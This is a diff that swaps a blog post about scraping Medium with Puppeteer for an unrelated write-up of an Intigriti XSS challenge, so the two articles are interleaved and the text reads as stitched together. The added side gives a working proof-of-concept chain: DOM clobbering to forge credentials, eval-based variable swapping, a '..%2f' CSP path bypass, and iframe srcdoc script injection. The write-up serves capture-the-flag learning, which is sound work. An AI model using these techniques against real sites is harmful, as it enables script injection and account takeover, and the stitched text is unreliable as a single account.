@@ -1,216 +1,534 @@
-Puppeteer is easy to use. Just find an existing example and look at the syntax, modify it, and you can use it directly. After studying the HTML structure a bit, I wrote the following code:
+But this `eval` seems unable to execute the code we want directly because the rules are quite strict (uppercase letters, some lowercase letters, numbers, and + -), so it may have other uses.
+
+Another possible place is here:
 
 ``` js
-const puppeteer = require('puppeteer')
-  
-async function main() {
-  const username = 'hulitw'
-  const url = 'https://medium.com/@' + username
-  
-  const browser = await puppeteer.launch({
-    headless: true
-  })
-  
-  // 造訪頁面
-  const page = await browser.newPage()
-  await page.goto(url, {
-    waitUntil: 'domcontentloaded'
-  })
-  
-  // 執行準備好的 script 並回傳資料 
-  const data = await page.evaluate(mediumParser)
-  console.log(data)
-  
-  await page.close()
-  await browser.close()
-}
-  
-function mediumParser() {
-  
-  // selector 是透過觀察而得來的
-  const elements = document.querySelectorAll('section > div:nth-child(2) > div > div')
-  const result = []
-  for (let i = 0; i < elements.length; i++) {
-    const h1 = elements[i].querySelector('h1')
-    const a = elements[i].querySelectorAll('a')
-    if (h1) {
-      result.push({
-        title: h1.innerText,
-        link: a[3].href
-      })
+let log = (prefix, data, type='info', safe=false) => {
+    let line = document.createElement("li");
+    let prefix_tag = document.createElement("span");
+    let text_tag = document.createElement("span");
+    switch (type){
+        // not important
     }
-  }
-  return result
-}
-  
-main()
+    
+    data = parse(data);
+    if (!safe){
+        data = data.replace(/</g, '&lt;');
+    }
+
+    prefix_tag.innerHTML = prefix;
+    text_tag.innerHTML = data;
+
+    line.appendChild(prefix_tag);
+    line.appendChild(text_tag);
+    document.querySelector('#console').appendChild(line);
+} 
 ```
 
-As long as you observe the HTML and CSS rules, you can get the data you want. But Medium is difficult to scrape because it uses [functional CSS](https://blog.techbridge.cc/2019/01/26/functional-css/) in the class name, and the class names are processed programmatically, so they may be different when Medium is updated.
+If safe is true, data will not be escaped, and any HTML can be inserted to achieve XSS.
 
-So in the end, I had to start with the HTML structure to extract the articles.
+It's worth noting the function's parameter section: `let log = (prefix, data, type='info', safe=false)`, which deserves special explanation.
 
-After solving this problem, there is another problem, which is infinite scrolling. Like many web pages, Medium needs to scroll down continuously to load new articles, and the rule that needs to be observed here is when to stop scrolling.
+In some programming languages, named parameters are supported, and when calling a function, parameters can be passed by name, such as `log(prefix='a', safe=true)`, which passes the corresponding parameters.
 
-After observation, I found that when the published articles are loaded, the `Highlighted by xxx` block will be displayed. Therefore, this element can be used as the termination condition.
+However, there is no such thing in JS, and the correspondence of parameters is entirely determined by "order." For example, `log("[logv]: ", window[m.message], safe=false, type='info');` corresponds to the following parameters:
 
-Then you can write a piece of code that keeps scrolling down until all articles are loaded:
+1. prefix: `"[logv]: "`
+2. data: `window[m.message]`
+3. type: `false`
+4. safe: `'info'`
+
+It is based on the order rather than the name, which is also a common confusion for many beginners.
+
+Anyway, let's start from the `log` function and work our way back. To execute this section, we need to post a message to this window and meet some conditions.
+
+## Level 1: Successfully post a message
+
+There are some conditions on this console.php page. If these conditions are not met, we cannot execute the log function.
+
+First, this page must be embedded in an iframe:
 
 ``` js
-/*
-  要用的話就是： await scroll(page)
-*/
-  
-function getArticlesCount() {
-  const elements = document.querySelectorAll('section > div:nth-child(2) > div > div')
-  return elements.length
-}
-  
-async function scroll(page) {
-  await page.evaluate('window.scrollTo(0, document.body.scrollHeight)')
-  try {
-  
-    // 終止條件
-    await page.waitForSelector('h4 ~ p', {
-      timeout: 1000
-    })
-  } catch(err) {
-  
-    // 印出目前抓到的文章數目
-    const count = await page.evaluate(getArticlesCount);
-    console.log(`Fetching... ${count} articles`)
-  
-    // 繼續往下捲動
-    await scroll(page);
-  }
+name = 'Console'
+document.title = name;
+if (top === window){
+    document.head.parentNode.remove(); // hide code if not on iframe
 }
 ```
 
-In order to let me see the progress on the console (to confirm that there are no bugs in the program), I added a piece of code that prints the number of articles on the screen every time it scrolls.
-
-At this point, you can get all the titles and links of the user's articles.
-
-What about the publication date? Can you get it?
-
-Yes, I can, but it's complicated. You can see from the Medium screenshot below:
-
-[Image]
-
-If the article was published this year (2019), the year won't be displayed. Otherwise, the publication year will be shown. Therefore, special processing is required here, and only the date can be obtained, not the exact time of publication.
-
-At this point, I got lazy and decided to switch to studying the API instead. 
-
-## Third Attempt: Puppeteer + API
-
-As I mentioned earlier, I wasn't familiar with GraphQL API at the time, so I gave up on it temporarily. However, after trying out Puppeteer, I came up with a new idea.
-
-In Puppeteer, you can add an event listener for network responses. When the page loads the article, it will definitely call the API to retrieve the article. Isn't this much easier? I don't have to figure out how to call the API myself. I let the page call the API itself, and I just listen to the response and study its format!
-
-The code looks something like this:
+Then there are these checks to pass:
 
 ``` js
-const apiResponses = []
-  
-page.on('response', async (response) => {
-    if (response._url.indexOf('graphql') < 0) return
-    const json = await response.json()
-    try {
-      const post = parsePosts(json)
-      apiResponses.push(...post)
-    } catch (err) {
+try {
+    if (!top.DEV)
+        throw new Error('Production build!');
+        
+    let checkCredentials = (username, password) => {
+        try{
+            let users = top.store.users;
+            let access = [users.admin, users.moderator, users.manager];
+            if (!users || !password) return false;
+            for (x of access) {
+                if (x.username === username && x.password === password)
+                    return true
+            }
+        } catch {
+            return false
+        }
+        return false
     }
-})
-  
-function parsePosts(json) {
-  const result = []
-  try {
-  
-    // 研究到一半沒做完
-    const streams = json.data.user.profileStreamConnection.stream
-    for (stream of streams) {
-      if (stream.itemType.__typename === 'StreamItemCompressedPostList') {
-  
+
+    let _onmessage = onmessage;
+    onmessage = e => {
+        let m = e.data;
+        if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {
+            return; // do nothing if unauthorized
+        }
+        // ...
+    }
+} catch {
+    // hide this script on production
+    document.currentScript.remove();
+}
+```
+
+`top.DEV` must be truthy, and the credentials passed in must match `top.store.users.admin.username` and `top.store.users.admin.password`.
+
+So should I write my own page and set these global variables?
+
+Unfortunately, due to the existence of Same Origin Policy, you can only access the contents of windows under the same origin page. Therefore, if you embed console.php in a page you wrote yourself, an error will occur when accessing `top.DEV`.
+
+So we need a same-origin page that allows us to set some things. And this page is obviously htmledit.php, which allows us to insert some HTML.
+
+## DOM clobbering
+
+How do we set global variables without executing JS? Yes, it's DOM clobbering.
+
+For example, if you have a `<div id="a"></div>`, in JS you can use `window.a` or `a` to access the DOM of this div.
+
+If you are not familiar with DOM clobbering, you can refer to my previous article [A Brief Discussion on the Principle and Application of DOM Clobbering](https://blog.huli.tw/2021/01/23/dom-clobbering/), or this one is also well written: [Expanding XSS with Dom Clobbering](https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/)
+
+If you want to achieve multi-level variable setting, you need to use `iframe` with `srcdoc`:
+
+``` html
+<a id="DEV"></a>
+<iframe name="store" srcdoc='
+    <a id="users"></a>
+    <a id="users" name="admin" href="ftp://a:a@a"></a>
+    '>
+</iframe>
+<iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
+```
+
+Here we also use a feature that the username attribute of the a element will be the username in the href attribute URL.
+
+In this way, `top.DEV` will be the DOM of `a id="DEV"></a>`, and `store.users` will be an HTMLCollection. `store.users.admin` is that a, and `store.users.admin.username` will be the username in href, which is `a`, and the password is the same.
+
+In summary, I can write my own HTML and use `window.open` to open htmledit.php and bring the above content into it:
+
+``` html
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>XSS POC</title>  
+</head>
+<body>
+  <script>
+    const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
+    const payload = `
+      <a id="DEV"></a>
+      <iframe name="store" srcdoc='
+        <a id="users"></a>
+        <a id="users" name="admin" href="ftp://a:a@a"></a>
+      '></iframe>
+      <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
+    `
+
+    var win = window.open(htmlUrl + encodeURIComponent(payload))
+
+    // wait unitl window loaded
+    setTimeout(() => {
+      console.log('go')
+      const credentials = {
+        username: 'a',
+        password: 'a'
       }
+      win.frames[1].postMessage({
+        cmd: 'test',
+        credentials
+      }, '*')
+    }, 5000)
+
+  </script>
+</body>
+</html>
+```
+
+In this way, I can use postMessage to send messages in.
+
+Although it took some effort, this is just the beginning.
+
+## Level 2: Make safe true
+
+To make safe true, so that `<` will not be escaped when calling log, we need to find a call that passes in four parameters, because the fourth one will be the value of safe:
+
+``` js
+case "logv": { // display variable's value by its name
+    log("[logv]: ", window[m.message], safe=false, type='info'); 
+    break;
+}
+case "compare": { // compare variable's value to a given one
+    log("[compare]: ", (window[m.message.variable] === m.message.value), safe=true, type='info'); 
+    break;
+}
+```
+
+`log("[logv]: ", window[m.message], safe=false, type='info')` is the function call I'm looking for, and the second parameter in it will be `window[m.message]`, which means that any global variable can be passed in as data. But what should be passed in?
+
+## Level 3: Find the variables that can be passed in
+
+I've been stuck here for a long time because I can't think of what can be passed in here. There used to be a trick to pass in name, but this webpage has already set its own name so it cannot be used. Another trick is to use URL to pass in and put things on location, but `log` will check whether `data` is a string. If it is not, it needs to be passed through `JSON.stringify`, which will encode the content.
+
+I had to keep repeating and looking at the code to see if I could find something new, and I really did. The following code has a common problem for beginners. Can you see it?
+
+``` js
+let checkCredentials = (username, password) => {
+    try{
+        let users = top.store.users;
+        let access = [users.admin, users.moderator, users.manager];
+        if (!users || !password) return false;
+        for (x of access) {
+            if (x.username === username && x.password === password)
+                return true
+        }
+    } catch {
+        return false
     }
-  } catch (err) {
-  
+    return false
+}
+```
+
+The problem lies in `for (x of access) {`, where `x` was not declared, so it defaults to a global variable. Here, `x` will be `top.store.users.admin`, which is the `<a>` we set ourselves.
+
+## Level 4: Bypassing Type Check
+
+Now that we have `x`, we can pass it into the `log` function using the `logv` command. Since `safe` is true, we can directly display the contents of `x` using `innerHTML`.
+
+If you convert an `a` element to a string, you will get the contents of `a.href`, so we can put our payload in `href`.
+
+However, `log` checks the type of `data`, and `a` is not a string, so it fails the check. What should we do?
+
+At this point, I looked back at the code and found this command:
+
+``` js
+case "reassign": { // change variable's value
+    let o = m.message;
+    try {
+        let RegExp = /^[s-zA-Z-+0-9]+$/;
+        if (!RegExp.test(o.a) || !RegExp.test(o.b)) {
+            throw new Error('Invalid input given!');
+        }
+        eval(`${o.a}=${o.b}`);
+        log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
+    } catch (err) {
+        log("[reassign]: ", `Error changing value (${err.message})`, type='err');
+    }
+    break;
+}
+```
+
+I can do this:
+
+``` js
+win.frames[1].postMessage({
+    cmd: 'reassign',
+    message:{
+      a: 'Z',
+      b: 'x+1'
+    },
+    credentials
+}, '*')
+```
+
+This is equivalent to `Z=x+1`, and when `x+1` is automatically converted to a string, `Z` will be a string containing our payload.
+
+## Level 5: Bypassing Encode
+
+Although we can now pass in a string, there is still one thing to do. The contents of `href` are URL-encoded, so `<` becomes `%3C`:
+
+``` js
+var a = document.createElement('a')
+a.setAttribute('href', 'ftp://a:a@a#<img src=x onload=alert(1)>')
+console.log(a+1)
+// ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1
+```
+
+What should we do now?
+
+In `log`, there is a line that says `data = parse(data)`, and the code for `parse` is like this:
+
+``` js
+let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string
+```
+
+If `e` is a string, it returns `s(e)`, and `s` is another function.
+
+When I was looking at the code, I noticed the rules for `eval` checking at the reassign part: `RegExp = /^[s-zA-Z-+0-9]+$/;`, and these four functions:
+
+``` js
+let a = (s) => s.anchor(s);
+let s = (s) => s.normalize('NFC');
+let u = (s) => unescape(s);
+let t = (s) => s.toString(0x16);
+```
+
+Among them, `s`, `u`, and `t` are allowed, which means that they can be swapped using the `reassign` command! We can replace `s` with `u`, so that `data` will be unescaped!
+
+So the final code will look like this:
+
+``` js
+const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
+const insertPayload=`<img src=x onerror=alert(1)>`
+const payload = `
+  <a id="DEV"></a>
+  <iframe name="store" srcdoc='
+    <a id="users"></a>
+    <a id="users" name="admin" href="ftp://a:a@a#${escape(insertPayload)}"></a>
+  '></iframe>
+  <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
+`
+
+var win = window.open(htmlUrl + encodeURIComponent(payload))
+
+// 等待 window 載入完成
+setTimeout(() => {
+  console.log('go')
+  const credentials = {
+    username: 'a',
+    password: 'a'
   }
-}
+  // s=u
+  win.frames[1].postMessage({
+    cmd: 'reassign',
+    message:{
+      a: 's',
+      b: 'u'
+    },
+    credentials
+  }, '*')
+
+  // Z=x+1 so Z = x.href + 1
+  win.frames[1].postMessage({
+    cmd: 'reassign',
+    message:{
+      a: 'Z',
+      b: 'x+1'
+    },
+    credentials
+  }, '*')
+
+  // log window[Z]
+  win.frames[1].postMessage({
+    cmd: 'logv',
+    message: 'Z',
+    credentials
+  }, '*')
+}, 5000)
 ```
 
-Each time a new response comes in, I can parse it and add it to an array. Finally, I will get the complete data from the API.
+So `data` will be `ftp://a:a@a#<img src=x onerror=alert(1)>`, and it will be set to HTML, triggering XSS!
 
-But then I found out that this approach wouldn't work either.
+No, things are not that easy... I forgot about CSP.
 
-Why? Because when the page is first loaded, the HTML returned from the server already contains the data for the first few articles. It's only when you scroll down that it uses AJAX to load new articles. This means that it's impossible to use the AJAX response to get all the article data, as you won't be able to get the data for the first few articles.
+## Level 6: Bypassing CSP
 
-At this point, I was a bit discouraged and thought that I had spent two days writing something that couldn't be used. I gave up on trying to retrieve the article list and decided to focus on what I really wanted to get.
+Although I can insert any HTML, unfortunately, this webpage also has CSP:
 
-The need to retrieve the article list actually came up suddenly. Before that, there was something else I wanted to get: followers. I wanted to count the number of followers for Taiwanese writers and see where I ranked (just to satisfy my vanity).
+```
+script-src 
+'nonce-xxx' 
+https://challenge-0721.intigriti.io/analytics/ 
+'unsafe-eval';
 
-After failing to retrieve the article list, I tried to use a similar approach to retrieve followers. However, I found that this method was too inefficient. If I loaded 25 followers each time I scrolled, it would take 40 scrolls to load 1000 followers.
+frame-src https:;
 
-If I couldn't do it myself, the answer was obvious: Google, please help me!
+object-src 'none';base-uri 'none';
+```
 
-## Fourth Attempt: Google
+Since there is no `unsafe-inline`, our previous payload is invalid. In this CSP, `https://challenge-0721.intigriti.io/analytics/` is obviously a suspicious path.
 
-I searched for "medium follower api" on Google, and the first search result was the official API, which was almost useless and required me to send an email to customer service to apply.
+This page actually imports a file called `https://challenge-0721.intigriti.io/analytics/main.js`, but it has nothing in it, just some comments.
 
-But the second search result caught my eye. It was a gist file: [Medium API: get number of followers for User · GitHub](https://gist.github.com/newhouse/843c444ddefe084ea7f01603627dbcfd).
+When I saw this, I knew how to do it, because I had learned a technique to bypass CSP before, using `%2F` (encoded `/`) and the inconsistency between URL parsing on the front and back ends.
 
-The code was only fifty lines long, very short. The most important line was:
+Taking `https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php` as an example, for the browser, this URL is under `/analytics`, so it can pass the CSP check.
+
+But for the server, this segment is actually `https://challenge-0721.intigriti.io/analytics/../htmledit.php`, which is `https://challenge-0721.intigriti.io/htmledit.php`.
+
+So we successfully bypassed CSP and loaded files from different paths!
+
+Therefore, the goal now is to find a file where we can put JS code. Looking around, only `htmledit.php` seems to work, but isn't it an HTML?
+
+## Level 7: Constructing JS Code
+
+If you still remember, there is an HTML comment at the beginning of this page:
+
+``` html
+<!-- &lt;img src=x&gt; -->
+....
+```
+
+In some cases, this syntax is actually a comment in JS. It's not me saying it, it's in the specification:
+
+![ECMAScript spec](/img/others/xss-july.jpg)
+
+In other words, we can take advantage of this and create a file that looks like HTML but is actually valid JS!
+
+The URL I finally came up with is: `https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*`
+
+The generated HTML looks like this:
+
+``` html
+<!-- 1; 這邊都是註解
+top.alert(document.domain);/* --> 這之後也都是註解了
+<!DOCTYPE html>
+<html lang="en">
+<head>
+...
+```
+
+The first line is a comment, and everything after `/*` is also a comment, so this entire section is actually just `top.alert(document.domain);`.
+
+However, it's worth noting that the content type of htmledit.php doesn't change and is still `text/html`. The reason we can import it as JS is because of the same origin relationship. If you import an HTML file from a different origin as JS, it will be blocked by [CORB](https://www.chromium.org/Home/chromium-security/corb-for-developers).
+
+At this point, we can make `data` equal to `<script src="https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*"></script>`, and it will execute when `text_tag.innerHTML = data` is called, bypassing CSP and successfully inserting the script into the page!
+
+But unfortunately, we're not quite there yet...
+
+## Level 8: Executing dynamically inserted scripts
+
+Just when I thought I was about to pass the level, I found that my script wouldn't execute no matter what I did. I looked up some [keywords](https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml) and found out that if you insert a script tag using innerHTML, it won't execute.
+
+I tried searching for solutions using keywords like `innerhtml import script` or `innerhtml script run`, but I couldn't find anything.
+
+Finally, I thought of trying `<iframe srcdoc="...">`. It was a bit of a long shot, but I figured I might as well try it since I had nothing to lose.
+
+As it turns out, it worked. If the content is `<iframe srcdoc="<script src='...'></script>"`, it will load the script directly.
+
+## Final solution
+
+One last thing to note is that before submitting my answer, I found that my answer wouldn't work on Firefox. The reason is this piece of code:
+
+``` html
+<a id="users"></a>
+<a id="users" name="admin" href="a"></a>
+```
+
+In Chrome, `window.users` will be an HTMLCollection, but in Firefox, it will only get one a element, and `window.users.admin` will be undefined.
+
+However, this isn't a big problem. You can solve it by adding another layer of iframe:
+
+``` html
+<iframe name="store" srcdoc="
+  <iframe srcdoc='<a id=admin href=ftp://a:a@a#></a>' name=users>
+">
+</iframe>
+```
+
+My final answer looks like this:
+
+``` html
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>XSS POC</title>  
+</head>
+
+<body>
+  <script>
+    const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
+    const exploitSrc = '/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*'
+    const insertPayload=`<iframe srcdoc="<script src=${exploitSrc}><\/script>">`
+    const payload = `
+      <a id="DEV"></a>
+      <iframe name="store" srcdoc="
+        <iframe srcdoc='<a id=admin href=ftp://a:a@a#${escape(insertPayload)}></a>' name=users>
+      ">
+      </iframe>
+      <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
+    `
+    var win = window.open(htmlUrl + encodeURIComponent(payload))
+
+    // wait for 3s to let window loaded
+    setTimeout(() => {
+      const credentials = {
+        username: 'a',
+        password: 'a'
+      }
+      win.frames[1].postMessage({
+        cmd: 'reassign',
+        message:{
+          a: 's',
+          b: 'u'
+        },
+        credentials
+      }, '*')
+
+      win.frames[1].postMessage({
+        cmd: 'reassign',
+        message:{
+          a: 'Z',
+          b: 'x+1'
+        },
+        credentials
+      }, '*')
+
+      win.frames[1].postMessage({
+        cmd: 'logv',
+        message: 'Z',
+        credentials
+      }, '*')
+    }, 3000)
+
+  </script>
+</body>
+</html>
+
+```
+
+## Other solutions
+
+My method was to open a new window to post a message, but you can also embed yourself as an iframe and let htmledit.php embed it. In this case, you can also use top.postMessage to send messages.
+
+Embedding yourself in another webpage is something I often forget.
+
+Another unexpected solution is based on this piece of code:
 
 ``` js
-// BUILD THE URL TO REQUEST FROM
-function generateMediumProfileUri(username) {
-  return `https://medium.com/@${username}?format=json`;
+case "log": {
+  log("[log]: ", e.data.message.text, type=e.data.message.type);
+  break;
 }
 ```
 
-What! It turns out that if you add `?format=json` to the URL, you can get the data in JSON format. This is amazing.
+The key point here is `type=e.data.message.type`, which sets a global variable called `type`. Therefore, you can pass in any payload through this and then call `logv`. This eliminates the need to handle the payload in the `a` tag.
 
-After putting the data into [JSON Formatter](https://jsonformatter.curiousconcept.com/), you can see the general structure:
+## Summary
 
-[Image]
+I really like this challenge because it feels like a series of levels that you have to pass one by one. Every time I thought I was about to pass a level, I would get stuck again, until I finally solved all the levels and successfully executed XSS.
 
-Here, you can get the user's profile information and some articles they've written, as well as our target: followers!
+From this challenge, you can learn the following frontend knowledge:
 
-Let's take a look at what user information we can get:
+1. DOM clobbering
+2. JS comments are not just `//` and `/* */`
+3. Bypassing CSP for paths
+4. Scripts added with innerHTML won't execute
+5. You can use iframe srcdoc to bypass this (but in general, you should add a script tag and append it)
 
-``` js
-"user":{  
-   "userId":"f1fb3e40dc37",
-   "name":"Huli",
-   "username":"hulitw",
-   "createdAt":1487549030919,
-   "imageId":"1*WQyJUJBQpBNIHH8GEWE6Sg.jpeg",
-   "backgroundImageId":"",
-   "bio":"自學程式，後來跑去唸哲學系但沒念完，前往新加坡工作了兩年半後決定放一年的假，到處旅遊。喜歡教學，發現自己好像有把事情講得簡單又清楚的能力，相信分享與交流可以讓世界更美好。\bMedium 文章列表請參考：https://aszx87410.github.io/blog/medium",
-   "allowNotes":1,
-   "mediumMemberAt":1542441600000,
-   "isNsfw":false,
-   "isWriterProgramEnrolled":true,
-   "isQuarantined":false,
-   "type":"User"
-}
-```
+From this topic, you can learn or review many skills. The interesting point of CTF and this type of challenge is here. Although you may know everything separately, it is very challenging to carefully string them together, which tests experience and skills.
 
-In addition to basic self-introduction and name, you can also get the time when the user became a Medium paid member and the time when the user became a Medium member. There's also an interesting flag: isNsfw.
-
-The only thing missing is the list of followers.
-
-Here, I tried the same method and added the parameter `https://medium.com/@hulitw/followers?format=json` to the Medium URL, and I actually got something! In the response, I found the data for 10 followers.
-
-Once we have the data, we can confirm that this API is useful. Next, we jump directly to the paging section at the bottom of the response:
-
-``` js
-"paging":{  
-   "path":"https://medium.com/_/api/users/f1fb3e40dc37/profile/stream",
-   "next":{  
-      "limit":10,
-      "to":"10590c54e527",
-      "source":"followers",
-      "page":2
-   }
-}
-```
+If you are interested in XSS challenges, you can follow [Intigriti](https://twitter.com/intigriti) and wait for the next challenge.
